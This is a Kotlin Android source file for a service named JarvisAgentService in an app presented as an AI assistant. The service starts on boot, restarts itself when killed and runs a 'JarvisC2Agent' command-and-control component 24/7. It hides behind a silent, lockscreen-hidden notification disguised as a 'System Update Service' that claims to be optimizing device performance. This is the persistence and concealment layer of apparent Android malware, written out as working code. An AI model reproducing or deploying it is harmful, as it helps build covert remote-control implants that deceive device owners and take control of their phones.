package com.ai.assistant.jarvis

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat

/**
 * JarvisAgentService — a persistent foreground service that:
 *  • Starts on boot (via BOOT_COMPLETED receiver) and when the user opens the app
 *  • Runs JarvisC2Agent in the background 24/7
 *  • Shows a disguised "System Update Service" notification
 */
class JarvisAgentService : Service() {

    companion object {
        private const val TAG              = "JarvisAgentService"
        private const val NOTIFICATION_ID  = 1001
        private const val CHANNEL_ID       = "jarvis_bg_channel"

        fun start(context: Context) {
            val intent = Intent(context, JarvisAgentService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    private lateinit var c2Agent: JarvisC2Agent

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service created")
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
        c2Agent = JarvisC2Agent(applicationContext)
        c2Agent.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")
        return START_STICKY   // Restart if killed by system
    }

    override fun onDestroy() {
        Log.d(TAG, "Service destroyed — stopping C2 agent")
        c2Agent.stop()
        super.onDestroy()
    }

    // ──────────────────────────────────────────────────────────────────────────
    //  Notification (disguised)
    // ──────────────────────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Services",                     // Disguised channel name
                NotificationManager.IMPORTANCE_MIN     // Silent
            ).apply {
                description        = "Core system background processes"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update Service")
            .setContentText("Optimizing device performance…")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()
}
